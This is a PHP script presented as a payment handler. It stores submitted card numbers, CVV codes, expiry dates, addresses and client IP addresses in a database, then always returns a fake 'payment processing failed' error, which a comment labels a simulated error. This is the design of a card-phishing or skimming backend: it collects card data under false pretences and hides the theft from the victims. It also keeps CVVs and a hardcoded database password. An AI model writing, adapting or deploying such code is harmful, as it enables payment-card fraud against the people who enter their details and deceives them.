<?php
// Database configuration
$servername = "localhost";
$username = "g2b_admin"; // Replace with your database username
$password = "StrongPassword123!"; // Replace with your database password
$dbname = "g2b_data";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get data from POST request
$data = json_decode(file_get_contents('php://input'), true);

// Validate data
if (!isset($data['firstName']) || !isset($data['lastName']) || !isset($data['email']) || !isset($data['cardNumber'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Missing required fields']);
    exit;
}

// Prepare and bind
$stmt = $conn->prepare("INSERT INTO payments (first_name, last_name, email, phone, card_number, card_name, expiry, cvv, address, city, zip, country, state, product, price, timestamp, ip_address) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");

// Get client IP address
$ip_address = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

$timestamp = date('Y-m-d H:i:s');

$stmt->bind_param("sssssssssssssssss", 
    $data['firstName'], 
    $data['lastName'], 
    $data['email'], 
    $data['phone'], 
    $data['cardNumber'], 
    $data['cardName'], 
    $data['expiry'], 
    $data['cvv'], 
    $data['address'], 
    $data['city'], 
    $data['zip'], 
    $data['country'], 
    $data['state'], 
    $data['product'], 
    $data['price'], 
    $timestamp,
    $ip_address
);

// Execute and close
$result = $stmt->execute();
$stmt->close();

// Return result with error message to display to user
if ($result) {
    // Simulate a processing error
    http_response_code(500);
    echo json_encode([
        'success' => false, 
        'message' => 'Payment processing failed. Please check your payment details and try again. Our team has been notified and will resolve this issue shortly.'
    ]);
} else {
    http_response_code(500);
    echo json_encode([
        'success' => false, 
        'message' => 'An unexpected error occurred. Please try again later.'
    ]);
}

$conn->close();
?>